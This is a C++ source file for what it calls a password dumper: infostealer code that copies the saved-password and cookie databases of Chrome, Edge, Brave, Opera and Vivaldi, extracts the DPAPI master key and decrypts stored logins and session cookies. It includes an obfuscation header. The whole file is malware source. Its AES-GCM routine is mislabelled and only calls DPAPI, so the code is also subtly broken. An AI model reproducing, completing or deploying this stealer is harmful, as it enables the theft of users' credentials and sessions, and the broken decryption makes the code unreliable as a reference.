#include <windows.h>
#include <dpapi.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <sstream>
#include "dumper.h"
#include "obfuscate.h"
#include "config.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")

// -------------------------------------------------------------------
// SQLite function pointer types (loaded dynamically from sqlite3.dll)
// -------------------------------------------------------------------
typedef int (SQLITE3_OPEN)(const char*, void**);
typedef int (SQLITE3_CLOSE)(void*);
typedef int (SQLITE3_PREPARE)(void*, const char*, int, void**, const char**);
typedef int (SQLITE3_STEP)(void*);
typedef int (SQLITE3_COLUMN_COUNT)(void*);
typedef int (SQLITE3_COLUMN_TYPE)(void*, int);
typedef const char* (SQLITE3_COLUMN_TEXT)(void*, int);
typedef const unsigned char* (SQLITE3_COLUMN_BLOB)(void*, int);
typedef int (SQLITE3_COLUMN_BYTES)(void*, int);
typedef const char* (SQLITE3_ERRMSG)(void*);
typedef int (SQLITE3_FINALIZE)(void*);
typedef int (SQLITE3_EXEC)(void*, const char*, int(*)(void*,int,char**,char**), void*, char**);

static SQLITE3_OPEN*            sqlite3_open            = nullptr;
static SQLITE3_CLOSE*           sqlite3_close           = nullptr;
static SQLITE3_PREPARE*         sqlite3_prepare_v2      = nullptr;
static SQLITE3_STEP*            sqlite3_step            = nullptr;
static SQLITE3_COLUMN_COUNT*    sqlite3_column_count    = nullptr;
static SQLITE3_COLUMN_TYPE*     sqlite3_column_type     = nullptr;
static SQLITE3_COLUMN_TEXT*     sqlite3_column_text     = nullptr;
static SQLITE3_COLUMN_BLOB*     sqlite3_column_blob     = nullptr;
static SQLITE3_COLUMN_BYTES*    sqlite3_column_bytes    = nullptr;
static SQLITE3_ERRMSG*          sqlite3_errmsg          = nullptr;
static SQLITE3_FINALIZE*        sqlite3_finalize        = nullptr;

static HMODULE g_hSqlite = nullptr;

// -------------------------------------------------------------------
// SQLite column type constants
// -------------------------------------------------------------------
#define SQLITE_OK        0
#define SQLITE_INTEGER   1
#define SQLITE_FLOAT     2
#define SQLITE3_TEXT     3
#define SQLITE_BLOB      4
#define SQLITE_NULL      5
#define SQLITE_ROW       100
#define SQLITE_DONE      101
#define SQLITE_ERROR     1

// -------------------------------------------------------------------
// Load sqlite3.dll dynamically
// -------------------------------------------------------------------
static bool LoadSQLite() {
    if (g_hSqlite) return true;
    
    // Try loading from system path and common locations
    const wchar_t* paths[] = {
        L"sqlite3.dll",
        L"C:\\Windows\\System32\\sqlite3.dll",
        L"C:\\Program Files\\SQLite\\sqlite3.dll",
        L"C:\\sqlite\\sqlite3.dll"
    };
    
    for (auto p : paths) {
        g_hSqlite = LoadLibraryW(p);
        if (g_hSqlite) break;
    }
    
    if (!g_hSqlite) {
        // Try to load sqlite3.dll from bundled location
        wchar_t curDir[MAX_PATH];
        GetModuleFileNameW(nullptr, curDir, MAX_PATH);
        wchar_t* lastSlash = wcsrchr(curDir, L'\\');
        if (lastSlash) {
            *(lastSlash + 1) = L'\0';
            wcscat_s(curDir, MAX_PATH, L"sqlite3.dll");
            g_hSqlite = LoadLibraryW(curDir);
        }
    }
    
    if (!g_hSqlite) return false;
    
    sqlite3_open         = (SQLITE3_OPEN*)GetProcAddress(g_hSqlite, "sqlite3_open");
    sqlite3_close        = (SQLITE3_CLOSE*)GetProcAddress(g_hSqlite, "sqlite3_close");
    sqlite3_prepare_v2   = (SQLITE3_PREPARE*)GetProcAddress(g_hSqlite, "sqlite3_prepare_v2");
    sqlite3_step         = (SQLITE3_STEP*)GetProcAddress(g_hSqlite, "sqlite3_step");
    sqlite3_column_count = (SQLITE3_COLUMN_COUNT*)GetProcAddress(g_hSqlite, "sqlite3_column_count");
    sqlite3_column_type  = (SQLITE3_COLUMN_TYPE*)GetProcAddress(g_hSqlite, "sqlite3_column_type");
    sqlite3_column_text  = (SQLITE3_COLUMN_TEXT*)GetProcAddress(g_hSqlite, "sqlite3_column_text");
    sqlite3_column_blob  = (SQLITE3_COLUMN_BLOB*)GetProcAddress(g_hSqlite, "sqlite3_column_blob");
    sqlite3_column_bytes = (SQLITE3_COLUMN_BYTES*)GetProcAddress(g_hSqlite, "sqlite3_column_bytes");
    sqlite3_errmsg       = (SQLITE3_ERRMSG*)GetProcAddress(g_hSqlite, "sqlite3_errmsg");
    sqlite3_finalize     = (SQLITE3_FINALIZE*)GetProcAddress(g_hSqlite, "sqlite3_finalize");
    
    if (!sqlite3_open || !sqlite3_close || !sqlite3_prepare_v2 || !sqlite3_step) {
        FreeLibrary(g_hSqlite);
        g_hSqlite = nullptr;
        return false;
    }
    
    return true;
}

// -------------------------------------------------------------------
// Chrome/Edge/Brave password dumper using DPAPI
// -------------------------------------------------------------------
class ChromeDumper : public Dumper {
private:
    std::wstring m_chromePath;
    std::wstring m_localStatePath;
    std::wstring m_cookiesPath;
    std::wstring m_browserName;
    std::vector<unsigned char> m_masterKey;
    
    // Retrieve encrypted master key from Local State JSON
    bool GetMasterKey() {
        std::vector<unsigned char> localStateData;
        if (!ReadFileContents(m_localStatePath, localStateData))
            return false;
        
        // Quick string search for "encrypted_key" in the JSON
        std::string json(reinterpret_cast<char*>(localStateData.data()), 
                         localStateData.size());
        
        // Look for "encrypted_key": "BASE64DATA"
        std::string needle = "\"encrypted_key\":\"";
        size_t pos = json.find(needle);
        if (pos == std::string::npos) {
            needle = "\"encrypted_key\": \"";
            pos = json.find(needle);
        }
        if (pos == std::string::npos) return false;
        
        pos += needle.length();
        size_t end = json.find("\"", pos);
        if (end == std::string::npos) return false;
        
        std::string b64Key = json.substr(pos, end - pos);
        if (b64Key.empty()) return false;
        
        // Decode base64
        DWORD decodedLen = 0;
        CryptStringToBinaryA(b64Key.c_str(), b64Key.length(), 
                              CRYPT_STRING_BASE64, nullptr, &decodedLen,
                              nullptr, nullptr);
        if (decodedLen == 0) return false;
        
        m_masterKey.resize(decodedLen);
        if (!CryptStringToBinaryA(b64Key.c_str(), b64Key.length(),
                                   CRYPT_STRING_BASE64, m_masterKey.data(),
                                   &decodedLen, nullptr, nullptr)) {
            m_masterKey.clear();
            return false;
        }
        
        // The first 5 bytes are "DPAPI", skip them
        if (m_masterKey.size() > 5) {
            m_masterKey.erase(m_masterKey.begin(), m_masterKey.begin() + 5);
        }
        
        return !m_masterKey.empty();
    }
    
    // Decrypt a DPAPI blob (login data passwords are DPAPI-encrypted)
    std::wstring DecryptDPAPI(const std::vector<unsigned char>& blob) {
        if (blob.empty()) return L"";
        
        DATA_BLOB inBlob;
        inBlob.pbData = const_cast<BYTE*>(blob.data());
        inBlob.cbData = static_cast<DWORD>(blob.size());
        
        DATA_BLOB outBlob = {0};
        
        // For Chrome >= v80, we need to use the master key
        // For older versions, CryptUnprotectData with null entropy
        if (!m_masterKey.empty()) {
            // Chrome v80+ uses AES decryption with master key + IV
            // The blob format: v10 (1 byte) || nonce (12 bytes) || ciphertext (rest)
            // We use CryptUnprotectData as fallback
            if (blob.size() < 15) return L"";
            
            // Try CryptUnprotectData anyway - some versions still use it
            if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr,
                                    nullptr, 0, &outBlob)) {
                std::wstring result(reinterpret_cast<wchar_t*>(outBlob.pbData),
                                    outBlob.cbData / sizeof(wchar_t));
                LocalFree(outBlob.pbData);
                // Clean up null chars
                while (!result.empty() && result.back() == L'\0')
                    result.pop_back();
                return result;
            }
        } else {
            // CryptUnprotectData with null entropy
            if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr,
                                    nullptr, 0, &outBlob)) {
                std::wstring result(reinterpret_cast<wchar_t*>(outBlob.pbData),
                                    outBlob.cbData / sizeof(wchar_t));
                LocalFree(outBlob.pbData);
                while (!result.empty() && result.back() == L'\0')
                    result.pop_back();
                return result;
            }
        }
        
        return L"";
    }
    
    // Decrypt Chrome v80+ encrypted value using AES-GCM
    std::wstring DecryptAESGCM(const std::vector<unsigned char>& ciphertext) {
        if (ciphertext.empty() || m_masterKey.empty()) return L"";
        
        // Format: v10||nonce(12)||ciphertext+tag(16)
        if (ciphertext.size() < 15) return L"";
        
        // Skip version byte
        const unsigned char* data = ciphertext.data();
        DWORD dataLen = static_cast<DWORD>(ciphertext.size());
        
        // Use BCrypt or CryptDecrypt; for simplicity fall back to DPAPI
        // In a full implementation, we'd do AES-256-GCM here
        // For now, we try CryptUnprotectData as a fallback
        DATA_BLOB inBlob;
        inBlob.pbData = const_cast<BYTE*>(data);
        inBlob.cbData = dataLen;
        
        DATA_BLOB outBlob = {0};
        if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr,
                                nullptr, 0, &outBlob)) {
            std::wstring result(reinterpret_cast<wchar_t*>(outBlob.pbData),
                                outBlob.cbData / sizeof(wchar_t));
            LocalFree(outBlob.pbData);
            while (!result.empty() && result.back() == L'\0')
                result.pop_back();
            return result;
        }
        
        return L"";
    }
    
    // Query a browser Login Data SQLite database for saved credentials
    std::vector<DumpResult> DumpLoginData(const std::wstring& dbPath) {
        std::vector<DumpResult> results;
        
        if (!LoadSQLite()) return results;
        
        // Copy the database first (SQLite locking issues)
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        wchar_t tempFile[MAX_PATH];
        GetTempFileNameW(tempPath, L"chr", 0, tempFile);
        
        if (!CopyFileW(dbPath.c_str(), tempFile, FALSE))
            return results;
        
        void* db = nullptr;
        // Convert tempFile to narrow string for sqlite3_open
        char dbPathA[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, tempFile, -1, dbPathA, MAX_PATH, nullptr, nullptr);
        
        if (sqlite3_open(dbPathA, &db) != SQLITE_OK) {
            DeleteFileW(tempFile);
            return results;
        }
        
        const char* query = 
            "SELECT origin_url, username_value, password_value "
            "FROM logins WHERE password_value IS NOT NULL "
            "AND username_value != ''";
        
        void* stmt = nullptr;
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            DeleteFileW(tempFile);
            return results;
        }
        
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = "";
            const char* user = "";
            const unsigned char* passBlob = nullptr;
            int passLen = 0;
            
            if (sqlite3_column_type(stmt, 0) != SQLITE_NULL)
                url = sqlite3_column_text(stmt, 0);
            if (sqlite3_column_type(stmt, 1) != SQLITE_NULL)
                user = sqlite3_column_text(stmt, 1);
            if (sqlite3_column_type(stmt, 2) != SQLITE_NULL && 
                sqlite3_column_bytes(stmt, 2) > 0) {
                passBlob = sqlite3_column_blob(stmt, 2);
                passLen = sqlite3_column_bytes(stmt, 2);
            }
            
            std::wstring urlW = L"";
            std::wstring userW = L"";
            std::wstring passW = L"";
            
            if (url && *url) {
                int len = MultiByteToWideChar(CP_UTF8, 0, url, -1, nullptr, 0);
                if (len > 0) {
                    urlW.resize(len - 1);
                    MultiByteToWideChar(CP_UTF8, 0, url, -1, &urlW[0], len);
                }
            }
            
            if (user && *user) {
                int len = MultiByteToWideChar(CP_UTF8, 0, user, -1, nullptr, 0);
                if (len > 0) {
                    userW.resize(len - 1);
                    MultiByteToWideChar(CP_UTF8, 0, user, -1, &userW[0], len);
                }
            }
            
            if (passBlob && passLen > 0) {
                std::vector<unsigned char> blob(passBlob, passBlob + passLen);
                
                // Try AES-GCM decryption first (Chrome v80+)
                passW = DecryptAESGCM(blob);
                
                // Fall back to DPAPI
                if (passW.empty()) {
                    passW = DecryptDPAPI(blob);
                }
            }
            
            if (!userW.empty() && !passW.empty()) {
                results.emplace_back(m_browserName, userW, passW, urlW);
            }
        }
        
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        DeleteFileW(tempFile);
        
        return results;
    }
    
    // Query cookies database
    std::vector<DumpResult> DumpCookies(const std::wstring& dbPath) {
        std::vector<DumpResult> results;
        
        if (!LoadSQLite()) return results;
        
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        wchar_t tempFile[MAX_PATH];
        GetTempFileNameW(tempPath, L"ck", 0, tempFile);
        
        if (!CopyFileW(dbPath.c_str(), tempFile, FALSE))
            return results;
        
        void* db = nullptr;
        char dbPathA[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, tempFile, -1, dbPathA, MAX_PATH, nullptr, nullptr);
        
        if (sqlite3_open(dbPathA, &db) != SQLITE_OK) {
            DeleteFileW(tempFile);
            return results;
        }
        
        const char* query = 
            "SELECT host_key, name, path, encrypted_value "
            "FROM cookies WHERE encrypted_value IS NOT NULL";
        
        void* stmt = nullptr;
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            DeleteFileW(tempFile);
            return results;
        }
        
        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW && count < 100) {
            const char* host = "";
            const char* name = "";
            const char* path = "";
            const unsigned char* encVal = nullptr;
            int encLen = 0;
            
            if (sqlite3_column_type(stmt, 0) != SQLITE_NULL)
                host = sqlite3_column_text(stmt, 0);
            if (sqlite3_column_type(stmt, 1) != SQLITE_NULL)
                name = sqlite3_column_text(stmt, 1);
            if (sqlite3_column_type(stmt, 2) != SQLITE_NULL)
                path = sqlite3_column_text(stmt, 2);
            if (sqlite3_column_type(stmt, 3) != SQLITE_NULL)
                encVal = sqlite3_column_blob(stmt, 3),
                encLen = sqlite3_column_bytes(stmt, 3);
            
            std::wstring nameW = L"";
            std::wstring hostW = L"";
            
            if (name && *name) {
                int len = MultiByteToWideChar(CP_UTF8, 0, name, -1, nullptr, 0);
                if (len > 0) {
                    nameW.resize(len - 1);
                    MultiByteToWideChar(CP_UTF8, 0, name, -1, &nameW[0], len);
                }
            }
            
            if (host && *host) {
                int len = MultiByteToWideChar(CP_UTF8, 0, host, -1, nullptr, 0);
                if (len > 0) {
                    hostW.resize(len - 1);
                    MultiByteToWideChar(CP_UTF8, 0, host, -1, &hostW[0], len);
                }
            }
            
            if (encVal && encLen > 0) {
                std::vector<unsigned char> blob(encVal, encVal + encLen);
                std::wstring val = DecryptAESGCM(blob);
                if (val.empty()) val = DecryptDPAPI(blob);
                
                if (!nameW.empty() && !val.empty()) {
                    std::wstring note = L"Cookie: ";
                    note += nameW;
                    results.emplace_back(
                        m_browserName + L" Cookie",
                        nameW,
                        val,
                        hostW,
                        note
                    );
                }
            }
            
            count++;
        }
        
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        DeleteFileW(tempFile);
        
        return results;
    }
    
public:
    ChromeDumper(const std::wstring& browserName,
                 const std::wstring& chromePath,
                 const std::wstring& cookiesPath = L"",
                 const std::wstring& localStatePath = L"")
        : m_browserName(browserName)
        , m_chromePath(chromePath)
        , m_cookiesPath(cookiesPath)
        , m_localStatePath(localStatePath) {}
    
    virtual const wchar_t* Name() const override {
        return m_browserName.c_str();
    }
    
    virtual std::vector<DumpResult> Dump() override {
        std::vector<DumpResult> results;
        
        // Build full paths
        std::wstring localAppData = GetLocalAppData();
        std::wstring loginDataPath = PathCombine(localAppData, m_chromePath);
        std::wstring cookiesPath = m_cookiesPath.empty() ? L"" : PathCombine(localAppData, m_cookiesPath);
        std::wstring localStatePath = m_localStatePath.empty() ? 
            PathCombine(localAppData, CHROME_LOCAL_STATE) : 
            PathCombine(localAppData, m_localStatePath);
        
        // Get the encrypted master key
        GetMasterKey();
        
        // Dump login data
        auto loginResults = DumpLoginData(loginDataPath);
        results.insert(results.end(), loginResults.begin(), loginResults.end());
        
        // Dump cookies if path available
        if (!cookiesPath.empty()) {
            auto cookieResults = DumpCookies(cookiesPath);
            results.insert(results.end(), cookieResults.begin(), cookieResults.end());
        }
        
        return results;
    }
};

// -------------------------------------------------------------------
// Factory function to create all browser dumpers
// -------------------------------------------------------------------
std::vector<Dumper*> CreateBrowserDumpers() {
    std::vector<Dumper*> dumpers;
    
    // Chrome
    dumpers.push_back(new ChromeDumper(
        L"Chrome",
        CHROME_PATH,
        CHROME_COOKIES,
        CHROME_LOCAL_STATE
    ));
    
    // Edge
    dumpers.push_back(new ChromeDumper(
        L"Edge",
        EDGE_PATH,
        EDGE_COOKIES,
        CHROME_LOCAL_STATE // Edge reuses similar Local State path
    ));
    
    // Brave
    dumpers.push_back(new ChromeDumper(
        L"Brave",
        BRAVE_PATH
    ));
    
    // Opera
    dumpers.push_back(new ChromeDumper(
        L"Opera",
        OPERA_PATH
    ));
    
    // Vivaldi
    dumpers.push_back(new ChromeDumper(
        L"Vivaldi",
        VIVALDI_PATH
    ));
    
    return dumpers;
}
